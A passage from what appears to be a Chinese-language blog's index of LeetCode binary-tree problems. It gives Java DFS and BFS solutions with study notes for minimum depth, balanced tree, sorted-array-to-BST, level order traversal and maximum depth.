<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MinimumDepthofBinaryTree</span></span>&#123;</span><br><span class="line">    <span class="comment">// Using DFS</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left==<span class="keyword">null</span>&amp;&amp;root.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left==<span class="keyword">null</span>||root.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> Math.max(minDepth(root.left),minDepth(root.right))+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Math.min(minDepth(root.left),minDepth(root.right))+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Attention</strong></p>
<pre><code>if(root.left==null||root.right==null){
    return Math.max(minDepth(root.left),minDepth(root.right))+1;
}
</code></pre><blockquote>
<p>注意返回值，如果一个节点只存在一个左或者右节点，那么不这么写的话，会返回空节点的深度。</p>
</blockquote>
<pre><code>    1
   /
  2
 /
3
</code></pre><blockquote>
<p>对于这样的树，可能会返回深度1，因为右子树深度为0。</p>
</blockquote>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><h3 id="非递归解决"><a href="#非递归解决" class="headerlink" title="非递归解决"></a>非递归解决</h3><p><strong>BFS方案</strong></p>
<blockquote>
<p>按照广度优先<code>按层</code>遍历节点：</p>
<ol>
<li>某一结点的左右子树均为空，则应该返回当前深度。</li>
<li>其他情况则继续按照BFS遍历节点。</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MinimumDepthofBinaryTree</span></span>&#123;</span><br><span class="line">    <span class="comment">// Using BFS</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left==<span class="keyword">null</span>&amp;&amp;root.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">int</span> level = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">int</span> size = queue.size();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line">                TreeNode node = queue.poll();</span><br><span class="line">                <span class="keyword">if</span>(node.left==<span class="keyword">null</span>&amp;&amp;node.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> level;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(node.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    queue.add(node.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(node.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    queue.add(node.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            level++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> level;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<ol>
<li>注意leaf node的定义，即没有左右子树；</li>
<li>注意此题中，对于一些边界检测的判断，只含有一个子树时，应该以存在的子树继续计算深度。</li>
</ol>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>recursion(递归)</tag>
        <tag>Boundary Check(边界值检测)</tag>
        <tag>BFS(广度优先遍历)</tag>
        <tag>DFS(深度优先遍历)</tag>
        <tag>Optimize(优化)</tag>
      </tags>
  </entry>
  <entry>
    <title>110. Balanced Binary Tree</title>
    <url>/2017/05/10/110-Balanced-Binary-Tree/</url>
    <content><![CDATA[<p>Given a binary tree, determine if it is height-balanced.</p>
<p>For this problem, a height-balanced binary tree is defined as a binary tree in which the depth of the two subtrees of every node never differ by more than 1.</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><blockquote>
<p>基本思路，遍历二叉树，递归算出每一个节点的左右子树高度，比较高度，不满足平衡二叉树，返回false；</p>
</blockquote>
<p><strong>递归解决</strong></p>
<blockquote>
<ol>
<li>从根结点开始向下遍历节点；</li>
<li>对每一个节点所构成的子树进行判断是否为平衡树；</li>
<li>继续递归该节点的左右节点（这个循环的嵌套值得研究）。</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BalancedBinaryTree</span></span>&#123;</span><br><span class="line">    <span class="comment">/*Recursion!*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isBalanced</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//这里判断了当前节点的平衡，并递归了其左右子树</span></span><br><span class="line">        <span class="keyword">return</span> getDepth(root.left)-getDepth(root.right)&lt;=<span class="number">1</span>&amp;&amp;isBalanced(root.left)&amp;&amp;isBalanced(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getDepth</span><span class="params">(TreeNode node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Math.max(getDepth(node.left),getDepth(node.right))+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    TreeNode left;</span><br><span class="line">    TreeNode right;</span><br><span class="line">    TreeNode(<span class="keyword">int</span> x) &#123; val = x; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>此时，由于需要对每一个节点进行平衡判断，每次都要取深度，那么时间复杂度是O(n)，需要对每一个节点都遍历，则时间复杂度是O(n2)。</p>
</blockquote>
<h2 id="Optimized-优化"><a href="#Optimized-优化" class="headerlink" title="Optimized(优化)"></a>Optimized(优化)</h2><blockquote>
<p>DFS解决，上面的取深度的方法思路虽然是从底部向上求的每一个节点的深度，但是，真正的判断是从root节点开始向下进行的。<br><br>优化的话，尽可能地在递归到二叉树的底部时添加判断操作。<br>判断当前节点构成的子树是否平衡：<br>&nbsp;&nbsp;&nbsp;&nbsp;1. 当前节点左右比较，高度差大于1，则不是平衡树。<br>&nbsp;&nbsp;&nbsp;&nbsp;2. 如果左子树不是平衡树，则当前节点构成的也一定不是平衡树，右子树也是如此。</p>
</blockquote>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BalancedBinaryTree3</span></span>&#123;</span><br><span class="line">    <span class="comment">/*Optimized!*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isBalanced</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> isBalancedHelp(root)!=-<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">isBalancedHelp</span><span class="params">(TreeNode node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> left = isBalancedHelp(node.left);</span><br><span class="line">        <span class="keyword">if</span>(left==-<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> right = isBalancedHelp(node.right);</span><br><span class="line">        <span class="keyword">if</span>(right==-<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Math.abs(left-right)&lt;=<span class="number">1</span>?Math.max(left,right)+<span class="number">1</span>:-<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里面有一点技巧要注意，判断完左子树后，应该立马对左子树的返回值进行判断，因为，如果左右子树只要有一个不是平衡二叉树，则无需进行，直接向上层返回。</p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>这种题目，如果不考虑优化，是很好解决的，遍历所有的节点并对所有节点构成的子树进行平衡判断，但是，时间复杂度太高了。<br>优化，只要某节点的左右子树中存在非平衡的树，那么上层则无需在判断，直接向上返回即可。</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>recursion(递归)</tag>
        <tag>DFS(深度优先遍历)</tag>
        <tag>Optimize(优化)</tag>
        <tag>AVL树(平衡二叉树)</tag>
      </tags>
  </entry>
  <entry>
    <title>108. Convert Sorted Array to Binary Search Tree</title>
    <url>/2017/05/10/108-Convert-Sorted-Array-to-Binary-Search-Tree/</url>
    <content><![CDATA[<p>Given an array where elements are sorted in ascending order, convert it to a height balanced BST.</p>
<p>Subscribe to see which companies asked this question</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p><strong>递归+二分法</strong></p>
<blockquote>
<p>这道题的思路主要是二分法，由于是一个BST，所以应该满足：节点的左节点小于根节点，右节点大于根节点。<br><br>所以这道题使用二分法来递归的把每一个节点放到BST中。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConvertSortedArraytoBinarySearchTree</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">sortedArrayToBST</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> high = nums.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> sortedArrayToBST(nums,low,high);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">sortedArrayToBST</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span></span>&#123;</span><br><span class="line">        TreeNode node = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(low&lt;=high)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = low + (high-low)/<span class="number">2</span>;</span><br><span class="line">             node = <span class="keyword">new</span> TreeNode(nums[mid]);</span><br><span class="line">             <span class="keyword">if</span>(low&lt;=mid-<span class="number">1</span>)&#123;</span><br><span class="line">                 node.left = sortedArrayToBST(nums,low,mid-<span class="number">1</span>);</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">if</span>(high&gt;=mid+<span class="number">1</span>)&#123;</span><br><span class="line">                 node.right = sortedArrayToBST(nums,mid+<span class="number">1</span>,high);</span><br><span class="line">             &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    TreeNode left;</span><br><span class="line">    TreeNode right;</span><br><span class="line">    TreeNode(<span class="keyword">int</span> x) &#123; val = x; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Boundary-Check-边界检测"><a href="#Boundary-Check-边界检测" class="headerlink" title="Boundary Check(边界检测)"></a>Boundary Check(边界检测)</h2><blockquote>
<p>二分法的边界检测有点糊涂，没有摸清，这里应该注意。</p>
</blockquote>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><p><strong>非递归解法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConvertSortedArraytoBinarySearchTree</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">sortedArrayToBST</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ( nums.length == <span class="number">0</span> ) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        TreeNode head = <span class="keyword">new</span> TreeNode(<span class="number">0</span>);</span><br><span class="line">        Queue&lt;TreeNode&gt; queue_node = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        Queue&lt;Integer&gt; queue_low = <span class="keyword">new</span> LinkedList&lt;Integer&gt;();</span><br><span class="line">        Queue&lt;Integer&gt; queue_high = <span class="keyword">new</span> LinkedList&lt;Integer&gt;();</span><br><span class="line">        queue_node.add(head);</span><br><span class="line">        queue_low.add(<span class="number">0</span>);</span><br><span class="line">        queue_high.add(nums.length-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">while</span>(!queue_node.isEmpty())&#123;</span><br><span class="line">            TreeNode node = queue_node.poll();</span><br><span class="line">            <span class="keyword">int</span> low = queue_low.poll();</span><br><span class="line">            <span class="keyword">int</span> high = queue_high.poll();</span><br><span class="line">            <span class="keyword">int</span> mid = low + (high-low)/<span class="number">2</span>;</span><br><span class="line">            node.val = nums[mid];</span><br><span class="line">            <span class="keyword">if</span>(low&lt;=mid-<span class="number">1</span>)&#123;</span><br><span class="line">                node.left = <span class="keyword">new</span> TreeNode(<span class="number">0</span>);</span><br><span class="line">                queue_node.add(node.left);</span><br><span class="line">                queue_low.add(low);</span><br><span class="line">                queue_high.add(mid-<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(high&gt;=mid+<span class="number">1</span>)&#123;</span><br><span class="line">                node.right = <span class="keyword">new</span> TreeNode(<span class="number">0</span>);</span><br><span class="line">                queue_node.add(node.right);</span><br><span class="line">                queue_low.add(mid+<span class="number">1</span>);</span><br><span class="line">                queue_high.add(high);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>还是DFS+递归和BFD+Queue的解题思路。二叉树的问题万变不离其宗。</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>recursion(递归)</tag>
        <tag>Queue(队列)</tag>
        <tag>Boundary Check(边界值检测)</tag>
        <tag>BFS(广度优先遍历)</tag>
        <tag>DFS(深度优先遍历)</tag>
        <tag>二分法</tag>
      </tags>
  </entry>
  <entry>
    <title>107. Binary Tree Level Order Traversal II</title>
    <url>/2017/05/08/107-Binary-Tree-Level-Order-Traversal-II/</url>
    <content><![CDATA[<p>Given a binary tree, return the bottom-up level order traversal of its nodes’ values. (ie, from left to right, level by level from leaf to root).</p>
<p>For example:<br>Given binary tree <code>[3,9,20,null,null,15,7]</code>,</p>
<pre><code>  3
 / \
9  20
  /  \
 15   7
</code></pre><p>return its bottom-up level order traversal as:</p>
<pre><code>[
  [15,7],
  [9,20],
  [3]
]
</code></pre><a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p>一开始有点蒙，因为我一直在想，除了相同的思路，然后在添加的时候反向添加，难道还有什么神奇的方法？</p>
<p><strong>思路相同：</strong><a href="https://war3cdota.github.io/2017/05/08/102-Binary-Tree-Level-Order-Traversal/">102. Binary Tree Level Order Traversal</a></p>
<p>这题应该自信一点，相同的思路，反向添加，切记自信！</p>
<p><strong>Using DFS</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreeLevelOrderTraversalII</span></span>&#123;</span><br><span class="line">    <span class="comment">//Using DFS</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrderBottom(TreeNode root) &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        levelOrderBottomHelp(res,root,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">levelOrderBottomHelp</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; res, TreeNode node, <span class="keyword">int</span> level)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(res.size()&lt;level)&#123;</span><br><span class="line">            res.add(<span class="number">0</span>,<span class="keyword">new</span> ArrayList&lt;Integer&gt;());</span><br><span class="line">        &#125;</span><br><span class="line">        res.get(res.size()-level).add(node.val);</span><br><span class="line">        <span class="keyword">if</span>(node.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            levelOrderBottomHelp(res,node.left,level+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(node.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            levelOrderBottomHelp(res,node.right,level+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><p><strong>Using BFS</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreeLevelOrderTraversalII2</span></span>&#123;</span><br><span class="line">    <span class="comment">// Using BFS</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrderBottom(TreeNode root) &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">int</span> length = queue.size();</span><br><span class="line">            List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(queue.peek().left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    queue.add(queue.peek().left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(queue.peek().right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    queue.add(queue.peek().right);</span><br><span class="line">                &#125;</span><br><span class="line">                list.add(queue.poll().val);</span><br><span class="line">            &#125;</span><br><span class="line">            res.add(<span class="number">0</span>,list);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>这种题目一定要自信的先把能想到的最好的方法做出来，然后再考虑是否还有另类的解法，关键是一定要自信！</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>recursion(递归)</tag>
        <tag>Queue(队列)</tag>
        <tag>BFS(广度优先遍历)</tag>
        <tag>DFS(深度优先遍历)</tag>
      </tags>
  </entry>
  <entry>
    <title>104. Maximum Depth of Binary Tree</title>
    <url>/2017/05/08/104-Maximum-Depth-of-Binary-Tree/</url>
    <content><![CDATA[<p>Given a binary tree, find its maximum depth.</p>
<p>The maximum depth is the number of nodes along the longest path from the root node down to the farthest leaf node.</p>
<h1 id="BinaryTree-Operation-二叉树操作"><a href="#BinaryTree-Operation-二叉树操作" class="headerlink" title="BinaryTree Operation(二叉树操作)"></a>BinaryTree Operation(二叉树操作)</h1><blockquote>
<p><a href="http://blog.csdn.net/luckyxiaoqiang/article/details/7518888" target="_blank" rel="noopener">http://blog.csdn.net/luckyxiaoqiang/article/details/7518888</a></p>
</blockquote>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><ol>
<li>从下向上的思想，先得到左右子树的深度。</li>
<li>选择左右子树中深度大的值+1作为当前深度返回上层。</li>
<li>如果当前节点为空，应该返回0表示第0层（第0层是不存在的那一层，因为是空）</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MaximumDepthofBinaryTree3</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> maxDepthHelp(root);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxDepthHelp</span><span class="params">(TreeNode node)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(node.left==<span class="keyword">null</span> &amp;&amp; node.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Math.max(maxDepthHelp(node.left),maxDepthHelp(node.right))+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Optimized-优化"><a href="#Optimized-优化" class="headerlink" title="Optimized(优化)"></a>Optimized(优化)</h2><p>其实，仔细看，完全没有必要再去新建一个方法，因为参数和返回值完全一致。所以，只用在现有函数上既可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MaximumDepthofBinaryTree3</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Math.max(maxDepth(root.left),maxDepth(root.right))+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>又是一道二叉树的问题，万变不离其宗，BFS，Stack，DFS，Queue，递归思路不能忘记！</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>recursion(递归)</tag>
        <tag>Optimize(优化)</tag>
      </tags>
  </entry>
  <entry>
    <title>102. Binary Tree Level Order Traversal</title>
    <url>/2017/05/08/102-Binary-Tree-Level-Order-Traversal/</url>
    <content><![CDATA[<p>Given a binary tree, return the level order traversal of its nodes’ values. (ie, from left to right, level by level).</p>
<p><strong>For example:</strong></p>
<p>Given binary tree <code>[3,9,20,null,null,15,7]</code></p>
<pre><code>  3
 / \
9  20
  /  \
 15   7
</code></pre><p>return its level order traversal as:</p>
<pre><code>[
  [3],
  [9,20],
  [15,7]
]
</code></pre><a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p>我觉得第一想法很重要，因为第一思路体现了你所学的和所知道的东西。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreeLevelOrderTraversal</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> List&lt;List&lt;Integer&gt;&gt; reslist = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123;</span><br><span class="line">        reslist = <span class="keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> reslist;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;TreeNode&gt; nodeList = <span class="keyword">new</span> ArrayList&lt;TreeNode&gt;();</span><br><span class="line">        List&lt;Integer&gt; levelList = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        nodeList.add(root);</span><br><span class="line">        levelList.add(root.val);</span><br><span class="line">        reslist.add(levelList);</span><br><span class="line">        levelOrderHelp(nodeList);</span><br><span class="line">        <span class="keyword">return</span> reslist;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">levelOrderHelp</span><span class="params">(List&lt;TreeNode&gt; list)</span></span>&#123;</span><br><span class="line">        List&lt;Integer&gt; levelList = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        List&lt;TreeNode&gt; nodeList = <span class="keyword">new</span> ArrayList&lt;TreeNode&gt;();</span><br><span class="line">        <span class="keyword">for</span>(TreeNode node:list)&#123;</span><br><span class="line">            <span class="keyword">if</span>(node.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                nodeList.add(node.left);</span><br><span class="line">                levelList.add(node.left.val);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(node.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                nodeList.add(node.right);</span><br><span class="line">                levelList.add(node.right.val);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(nodeList.size()==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        reslist.add(levelList);</span><br><span class="line">        levelOrderHelp(nodeList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这解法是我第一想法，在最短的时间内我所得到的AC思路。应该值得去优化下，我第一想法，想到了利用递归；但是有很多地方是做的很冗余的，对于遍历二叉树和存储二叉树节点的值，我使用了两个数组。</p>
<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><p><strong>DFS思路</strong></p>
<p>减少数组的使用，使用DFS深度优先遍历+递归</p>
